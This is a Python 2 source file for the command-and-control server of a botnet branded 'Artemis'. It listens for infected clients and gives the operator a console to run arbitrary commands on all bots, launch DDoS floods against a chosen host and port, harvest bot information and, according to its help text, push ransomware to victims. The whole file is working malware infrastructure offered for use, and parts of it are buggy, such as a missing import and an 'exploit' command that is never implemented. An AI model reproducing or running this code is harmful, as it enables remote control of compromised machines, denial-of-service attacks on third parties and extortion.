import socket
import time
import threading
import random
import ctypes

hosts = []
tlock = threading.Lock()

colors = [0x03,0x04,0x06,0x2]

STD_OUTPUT_HANDLE= -11
green = 0x02
white = 0x5
yellow = 0x06
testx = 0x02
cyan = random.choice(colors)
std_out_handle = ctypes.windll.kernel32.GetStdHandle(STD_OUTPUT_HANDLE)
def set_color(color, handle=std_out_handle):
    bool = ctypes.windll.kernel32.SetConsoleTextAttribute(handle, color)
    return bool

set_color(cyan)
print "\t\t |---------------------------------------------------------------|"
print "\t\t |    ###    ########  ######## ######## ##     ## ####  ######  |"
print "\t\t |   ## ##   ##     ##    ##    ##       ###   ###  ##  ##    ## |"
print "\t\t |  ##   ##  ##     ##    ##    ##       #### ####  ##  ##       |"
print "\t\t | ##     ## ########     ##    ######   ## ### ##  ##   ######  |"
print "\t\t | ######### ##   ##      ##    ##       ##     ##  ##        ## |"
print "\t\t | ##     ## ##    ##     ##    ##       ##     ##  ##  ##    ## |"
print "\t\t | ##     ## ##     ##    ##    ######## ##     ## ####  ######  |"
print "\t\t |LOADING... ARTEMIS BOTNET BY VORTEX | IG @root.access_127.0.0.1|"
print "\t\t |---------------------------------------------------------------|"
set_color(white)
for x in range(2):
    print "Loading\r",
    ctypes.windll.kernel32.SetConsoleTitleA("| ARTEMIS BY VORTEX | Loading.")
    time.sleep(0.25)
    print "                  \r",
    ctypes.windll.kernel32.SetConsoleTitleA("| ARTEMIS BY VORTEX | Loading..")
    print "Loading.\r",
    time.sleep(0.25)
    print "                  \r",
    ctypes.windll.kernel32.SetConsoleTitleA("| ARTEMIS BY VORTEX | Loading...")
    print "Loading..\r",
    time.sleep(0.25)
    print "                  \r",
    print "Loading...\r",
    ctypes.windll.kernel32.SetConsoleTitleA("| ARTEMIS BY VORTEX | Loading")
    time.sleep(0.25)
    print "                  \r",



def title():
    while True:
        ctypes.windll.kernel32.SetConsoleTitleA("| ARTEMIS BY VORTEX | Bots Online: "+str(len(hosts)))
        time.sleep(2)
def alive(c):
    while True:
        try:
            c.send('alive')
            if c.recv(1024):
                if c not in hosts:
                    hosts.append(c)
                else:
                    pass
            time.sleep(0.25)
        except:
            try:
                hosts.remove(c)
            except:
                pass
def await(s):
    while True:
        c, addr = s.accept()
        hosts.append(c)
        threading.Thread(target=alive, args=(c,)).start()
try:
    s = socket.socket()
    host = '192.168.1.166'
    port = 7070
    s.bind((host,port))
    s.listen(256)
    set_color(green)
    print "\t\t Loaded Succuessfully! | Bound to: Host: {0} Port: {1}\n\n".format(host,port),
    set_color(white)
except:
    print " Coudln't bind socket."
    time.sleep(5)
    sys.exit(1)
threading.Thread(target=await, args=(s,)).start()
threading.Thread(target=title).start()
while True:
    with tlock:
        cmd = raw_input(" Artemis ~# ")
    if cmd == 'bots':
        print " Amount of bots: "+str(len(hosts))
    elif cmd == 'help':
        set_color(yellow)
        print "  bots - display bots\n",
        print "  help - shows this message\n",
        print "  infox ID - specific bot info\n",
        print "  sp:cmd - send cmd response to server\n",
        print "  DDOS:host:port - DDoS a server\n",
        print "  exploit - infect clients with ransomware\n",
        print "  close ID - Close connection from user\n",
        print "  info - gather all bot info\n",
        set_color(white)
    elif 'infox' in cmd:
        bot = cmd.split(' ')[1]
        try:
            ch = hosts[int(bot)]
            ch.send('info')
            while True:
                output = ch.recv(1024)
                if output != 'yes':
                    set_color(testx)
                    print output
                    set_color(white)
                    break
        except:
            print " No bot could be found"
    elif 'close ' in cmd:
        uid = cmd.split(' ')[1]
        c = hosts[int(uid)]
        c.send('close')
    elif 'sp:' in cmd:
        cmd = cmd.split(':')[1]
        xy = 0
        for c in hosts:
            c.send('sp:'+cmd)
            while True:
                out = c.recv(1024)
                if 'out:' in out:
                    print "["+str(xy)+"] "+out+"\n\n",
                    break
                else:
                    pass
            xy += 1
    elif 'DDOS:' in cmd:
        for c in hosts:
            c.send(cmd)
    elif cmd == 'info':
        xy = 0
        for c in hosts:
            c.send('info')
            set_color(testx)
            while True:
                out = c.recv(1024)
                if 'yes' not in out:
                    print "["+str(xy)+"] "+out+"\n",
                    break
            xy += 1
        set_color(white)
    else:
        for c in hosts:
            c.send(cmd)
